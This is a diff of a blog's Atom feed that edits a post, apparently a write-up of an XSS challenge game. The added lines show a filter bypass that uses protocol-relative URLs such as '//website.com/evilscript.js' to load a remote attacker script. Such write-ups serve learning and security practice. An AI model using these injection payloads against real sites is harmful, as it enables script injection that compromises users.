@@ -4,7 +4,7 @@
   <title><![CDATA[My portfolio]]></title>
   <link href="http://paulsec.github.io/atom.xml" rel="self"/>
   <link href="http://paulsec.github.io/"/>
-  <updated>2014-06-03T08:37:29+02:00</updated>
+  <updated>2014-06-03T17:55:13+02:00</updated>
   <id>http://paulsec.github.io/</id>
   <author>
     <name><![CDATA[Paul A. (PaulSec)]]></name>
@@ -157,8 +157,8 @@ Then, we were able to load remote scripts this way:</p>
 
 <p>the index page only had to contain some javascript like: <code>alert(1);</code>.</p>
 
-<p>I saw on the internet that some people didn&rsquo;t manage to load some HTTP scripts because the game is only in HTTPS.
-You can create a simple HTTPS Server (using Node.js for example).</p>
+<p>I saw on the internet that some people didn&rsquo;t manage to load some HTTP scripts because they were using the HTTPS version.
+In this case, you can create a simple HTTPS Server (using Node.js for example).</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -195,14 +195,23 @@ You can create a simple HTTPS Server (using Node.js for example).</p>
 
 <p><em>Simple HTTPS Server using Node.js</em></p>
 
-<p>If you run a HTTPS Server, just add this as a payload:</p>
+<p>In both cases, you could bypass the filter using:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">//website.com/evilscript.js</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><strong>//</strong> is another way to say <code>https</code> or <code>http</code> depending on the protocol you were using.</p>
+
+<p>For example, if we have our HTTPS Server running, we can inject this:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">//127.0.0.1:8000</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><code>//</code> is another way to say <code>https</code>.</p>
+<p>Done.</p>
 
 <p>Hope you learnt at least one trick.
 This game was really fun. Waiting for the next one.</p>
